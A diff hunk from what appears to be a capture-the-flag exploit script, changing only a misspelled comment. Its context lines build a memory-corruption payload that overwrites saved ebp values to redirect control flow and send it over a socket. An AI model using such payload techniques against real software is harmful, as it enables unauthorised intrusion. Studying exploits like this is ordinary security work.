@@ -71,7 +71,7 @@ s.recv()
 
 
 iphone8()
-# delete to set ebp value point to prociate position when leaving delete() function
+# delete to set ebp value point to approciate position when leaving delete() function
 # var_up_to_ret
 payload6 = p32(0x0804b033) + "\x00"*4 + p32(ebp_delete-0xc)+p32(ebp_handler-0x4a)
 s.sendline(payload6)
